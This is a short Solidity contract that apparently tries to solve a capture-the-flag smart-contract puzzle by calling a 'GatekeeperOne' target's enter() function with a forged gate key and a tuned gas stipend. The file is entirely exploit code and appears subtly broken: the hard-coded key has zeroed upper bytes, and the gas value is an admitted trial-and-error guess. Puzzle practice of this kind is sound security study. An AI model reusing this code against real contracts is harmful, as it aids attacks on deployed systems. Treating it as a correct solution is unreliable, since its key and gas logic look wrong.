pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperExploitV2 {
    IGatekeeperOne public immutable instance;

    constructor(address _instance) {
        instance = IGatekeeperOne(_instance);
    }

    function attack() external payable {
        bytes8 gateKey = bytes8(uint64(0x0000000000002266));
        
        // GateTwo: Need to find gas value where (gasleft() % 8191) == 0
        // Trial and error approach to adjust the gas stipend
        instance.enter{gas: 8191 * 2 + 1}(gateKey);
    }
}